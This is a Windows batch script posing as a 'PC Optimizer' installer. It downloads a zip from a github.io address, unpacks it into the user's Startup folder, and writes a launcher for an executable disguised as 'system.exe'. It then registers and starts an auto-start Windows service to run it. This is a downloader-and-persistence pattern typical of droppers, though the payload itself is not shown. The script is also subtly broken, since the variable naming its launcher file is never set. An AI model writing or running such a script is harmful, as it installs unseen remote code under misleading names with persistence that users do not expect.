@echo off
setlocal

:: ===== CONFIGURATION =====
:: Replace the URL with your actual zip file link
set "URL=https://luckiestpancake.github.io/Files/test.zip"
set "ZIP_NAME=downloaded_app.zip"
set "TARGET_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\pc-optimizer"
set "EXE_NAME=system.exe"
set "SERVICE_NAME=PCOptimizer"
set "SERVICE_DISPLAY=PC Optimizer Service"

echo Creating Target Directory...
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

echo Downloading file with wget...
:: Using powershell's wget (alias for Invoke-WebRequest)
powershell -Command "wget '%URL%' -OutFile '%TARGET_DIR%\%ZIP_NAME%'"

echo Extracting files...
powershell -Command "Expand-Archive -Path '%TARGET_DIR%\%ZIP_NAME%' -DestinationPath '%TARGET_DIR%' -Force"

echo Moving files from nested folder...
:: Move all files from the nested pc-optimizer folder to the target directory
for /d %%i in ("%TARGET_DIR%\pc-optimizer\*") do move "%%i" "%TARGET_DIR%\"
move "%TARGET_DIR%\pc-optimizer\*" "%TARGET_DIR%\" 2>nul
rmdir "%TARGET_DIR%\pc-optimizer" 2>nul

echo Cleaning up zip file...
del "%TARGET_DIR%\%ZIP_NAME%"

:: Create batch file to start your application
(
  echo @echo off
  echo cd /d "%TARGET_DIR%"
  echo start "" "%EXE_NAME%"
) > "%TARGET_DIR%\%BAT_FILE%"

echo Checking if service already exists...
sc query "%SERVICE_NAME%" >nul 2>&1
if %errorlevel% equ 1060 (
    echo Service does not exist. Creating new service...
    sc create "%SERVICE_NAME%" binPath= "cmd.exe /c \"%TARGET_DIR%\%BAT_FILE%\"" start= auto DisplayName= "%SERVICE_DISPLAY%"
    echo Service created successfully.
) else (
    echo Service already exists. Updating service...
    sc config "%SERVICE_NAME%" binPath= "cmd.exe /c \"%TARGET_DIR%\%BAT_FILE%\"" start= auto DisplayName= "%SERVICE_DISPLAY%"
    echo Service updated successfully.
)

echo Starting service...
sc start "%SERVICE_NAME%"

echo Installation complete.
